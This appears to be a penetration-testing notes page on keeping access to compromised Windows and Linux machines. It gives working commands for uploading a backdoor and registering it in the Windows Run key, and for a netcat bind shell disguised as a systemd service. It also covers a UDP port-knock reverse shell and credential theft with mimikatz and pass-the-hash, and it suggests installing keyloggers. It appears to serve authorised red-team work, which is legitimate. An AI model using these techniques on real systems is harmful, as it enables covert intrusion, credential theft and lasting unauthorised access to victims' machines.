# Methods of Persistence
1) [Passwords](#Passwords)
   1) [Pass the Hash](#Pass-the-Hash)
   2) Crack the Hash
2) [Backdoor](#Backdoor)
3) [New User](#New-User)
4) [DLL Preloading / DLL Hijacking](#DLL-Preloading)

# Passwords
1) [Get Windows passwords with mimikatz](../../Tools/Credentials_Cryptography/mimikatz/README.md)
2) [Get Windows passwords and hashes with Meterpreter](../../Tools/Metasploit/README.md#Get-Windows-Credentials).
3) [Get SMB Hashes with Meterpreter](../../Tools/Metasploit/README.md#Capture-SMB-Hashes).
4) [Use Windows Credentials Editor](../../Tools/Credentials_Cryptography/WCE/README.md)

### Pass the Hash
1) [Use Meterpreter SMB module and specify SMBPass as the capture hash](../../Tools/Metasploit/README.md#Establish-Reverse-Shell-with-SMB).
2) RDP with password or pass the hash.
   1) Check if RDP is enable by attempting a connection.  Do this before enabling RDP to know to disable RDP, when done with the engagement.
   2) Enable RDP with [Meterpreter](../../Tools/Metasploit/README.md#Enable-RDP) or [Windows](../../Tools/Shells/Windows/CMD/README.md#Start-Service).
   3) [Add user to group "Remote Desktop Users"](../../Tools/Shells/Windows/CMD/README.md#Add-User-to-a-Local-Group).
   4) [Pass the Hash over RDP](../../Tools/RDP/freerdp/README.md#Pass-The-Hash).

    [Pass-the-Hash Is Dead: Long Live LocalAccountTokenFilterPolicy](https://blog.harmj0y.net/redteaming/pass-the-hash-is-dead-long-live-localaccounttokenfilterpolicy/)

# Backdoor
##### Steps
1) Upload backdoor to victim.
2) Execute at prefixed times.
3) Automatically run on boot.

##### Methods
1) [Meterpreter](../../Tools/Metasploit/README.md#Persistence)
2) Manually from Meterpreter
   1) Upload payload created with msfvenom, Veil, BDF, etc. ```meterpreter > upload /root/backdoor.exe C:\\Windows\```
   2) Edit Windows Registry ```meterpreter > reg setval -k HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -d "C:\Windows\backdoor.exe" -v MyBackdoorName```

# New User
1) [Add user](../../Tools/Shells/Windows/CMD/README.md#Add-User).
2) [Add user to group "Administrators"](../../Tools/Shells/Windows/CMD/README.md#Add-User-to-a-Local-Group).

# [DLL Preloading](../DLL_Preloading/README.md)


# Xinetd UDP Portknock Backdoor
##### [Step 1 - On Target, create xinetd service](https://gist.github.com/anonymous/3cb8e474b6bb3fd3787bda1e1a55cf56)
[Local File](../../Tools/Shells/Persistence/xinetd/xinetd_server.sh)

It requires that netcat is on the target, in the /bin directory.  It copies netcat to file /bin/services.udp.
##### Step 2 - Start netcat listener on Attack machine
```bash
nc -lnvp <Port #>
```
##### Step 3 - Send a single UDP packet to target, "knocking," and causing the target to establish a reverse shell.
```bash
hping3 -2 -c 1 <Target IP Address> -p 65534
```

### Portknocking References
[Port knocking](https://en.wikipedia.org/wiki/Port_knocking)

# Systemd Netcat Bind Shell
##### Step 1 - On Target, copy netcat to a new file, in /lib/systemd directory.
```bash
cp /bin/nc /lib/systemd/systemd-service
```
##### Step 2 - On Target, create file /lib/systemd/system/systemd-service with following contents
[systemd-service](../../Tools/Shells/Persistence/Systemd/systemd-service)
```bash
[Unit]
Description = Systemd Service
After = network.target
[Service]
ExecStart = /lib/systemd/systemd-service -lvp 56825 -e /bin/sh
[Install]
WantedBy = multi-user.target
```
##### Step 3 - On Target, enable & start service
```bash
systemctl enable systemd.service
systemctl start systemd.service
```
##### Step 4 - Confirm that port is listening on the target
```bash
netstat -auntp | grep 56825
```
##### [Step 5 - From Attack machine, establish shell (Note Port # 56825)](../../Tools/Shells/Bind/README.md#Netcat-Bind-Shell)

# Meterpreter - Windows
1) [Check process ID](../../Tools/Metasploit/README.md#Get-Processes).
2) Migrate to SvcHost.exe [by Process ID](../../Tools/Metasploit/README.md#Migrate-to-Another-Process-ID) or [by Process name](../../Tools/Metasploit/README.md#Migrate-to-Another-Process-Name).
3) [Retrieve password hashes from victim](../../Tools/Metasploit/README.md#Migrate-to-Another-Process-ID) or [by Process name](../../Tools/Metasploit/README.md#Get-Windows-Credentials).
4) [Pass-the-Hash with psexec](../../Tools/Metasploit/README.md#Establish-Reverse-Shell-with-SMB).
5) [If psexec fails due to STATUS_ACCESS_DENIED, update the registry on the target](../../Tools/Metasploit/README.md#Update-Registry-to-Allow-SMB-Access).
6) If user changes password, we will lose access.
   1) Install keylogger.
   2) Add new user to machine. 
      1) Check if RDP is enable by attempting a connection.  Do this before enabling RDP to know to disable RDP, when done with the engagement.
      2) Enable RDP with [Meterpreter](../../Tools/Metasploit/README.md#Enable-RDP-and-Add-User). 
7) [Create backdoor](../../Tools/Metasploit/README.md#Persistence). 